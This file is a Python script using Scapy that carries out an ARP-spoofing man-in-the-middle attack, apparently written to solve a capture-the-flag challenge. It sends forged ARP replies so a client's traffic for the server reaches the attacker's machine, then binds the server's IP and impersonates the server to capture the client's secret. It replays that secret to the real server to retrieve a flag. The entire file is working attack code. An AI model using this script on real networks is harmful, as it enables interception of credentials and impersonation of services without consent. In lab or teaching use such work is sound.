#!/bin/python

from scapy.all import *
from socket import * 

import time
import sys 
import os


NET_INTER = conf.iface.name

IP_ATTACK = get_if_addr(NET_INTER)
IP_CLIENT = "10.0.0.2"
IP_SERVER = "10.0.0.3"

PORT_SERVER=31337



def arp_get_server_mac(curr_mac):
    arp_pack = ARP(hwsrc=curr_mac, psrc=IP_ATTACK, op=1,
                   hwdst="ff:ff:ff:ff:ff:ff", pdst=IP_SERVER)
    result, _ = sr(arp_pack)
    return result[0][1].hwsrc 


def arp_setup_server_mac(new_mac):
    arp_pack = ARP(psrc=IP_SERVER, pdst=IP_CLIENT,
                   hwsrc=new_mac, op=2)
    send(arp_pack)


def emulate_server():
    s = socket()

    while True:
        try:
            s.bind(("0.0.0.0", PORT_SERVER))
            break
        except OSError as e:
            time.sleep(1)
            pass

    s.listen()

    secret = 0

    while True:
        try:
            conn, _ = s.accept()
            conn.settimeout(3)

            conn.send(b"secret: ")
            secret = conn.recv(1024)

            # restart client state 
            conn.send(b"command: ")
            time.sleep(2)
            buf = " "

            try:
                while conn.recv(1024):
                    pass
            except timeout as e:
                print(str(e))


            conn.send(b"Hello, World!")
            conn.close()

            print("Server successfuly emulated?")
            
            break
        except Exception as e:
            print("server emulator connection error: " + str(e))
            exit(3)

    s.close()
    return secret


def emulate_client(server_secret):
    s = socket()
    s.connect(('10.0.0.3', 31337))
    s.settimeout(3)

    time.sleep(1)

    try:
        s.recv(128)
    except timeout as _:
        pass

    s.send(server_secret)
    time.sleep(2)

    try:
        resp = s.recv(1024).decode().split()
        if resp not in ["command"]:
            print(f"Error in client emulation. Server incorect response ({resp})")
            exit(5)
    except:
        pass

    s.send(b"flag ");
    time.sleep(5)
    return s.recv(1024).decode()


def main():
    if len(sys.argv) != 2:
        print("Usage: ./mitm [own mac-addr]")
        exit(1)

    if os.geteuid():
        print("Not root!")
        exit(2)

    own_mac = sys.argv[1]
    #server_mac = arp_get_server_mac(own_mac)
    
    #set up current net as the victim server
    arp_setup_server_mac(own_mac)
    os.system(f"ip addr add {IP_SERVER} dev {NET_INTER}")

    server_secret = emulate_server()
    print("secret: " + str(server_secret))

    os.system(f"ip addr del {IP_SERVER} dev {NET_INTER}")
    flag = emulate_client(server_secret)

    print("flag: " + str(flag))


if __name__ == "__main__":
    main()
